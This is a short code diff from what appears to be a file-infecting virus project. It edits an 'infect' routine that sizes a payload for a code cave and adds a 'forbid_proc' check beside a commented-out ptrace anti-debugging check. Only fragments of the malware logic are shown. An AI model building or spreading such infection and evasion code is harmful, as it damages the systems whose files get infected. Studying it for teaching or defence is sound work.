@@ -150,9 +150,6 @@ static int	infect(const char *filename, const char *self_name)
 
 	/* get our own name */
 	ft_strlcpy(data.self_name, self_name, sizeof(data.self_name));
-	//if (self_name(&data) != 0) {
-	//	return 1;
-	//}
 
 	/* calculate the size of the payload before the mapping */
 	data.cave.p_size = (size_t)&end - (size_t)&_start;
@@ -233,8 +230,14 @@ static void	open_file(const char *file, const char *self_path, size_t *counter)
 
 void	famine(void)
 {
-	//if (check_ptrace() != 0) 
+	//if (check_ptrace() != 0 || forbid_proc() != 0)
 	//	_syscall(SYS_exit, 1);
+	if (forbid_proc() != 0) {
+		char msg[] = "forbid_proc\n";
+		_syscall(SYS_write, 2, msg, sizeof(msg));
+		_syscall(SYS_exit, 1);
+	}
+
 	size_t counter = 0;
 	char host_name[PATH_MAX];
 
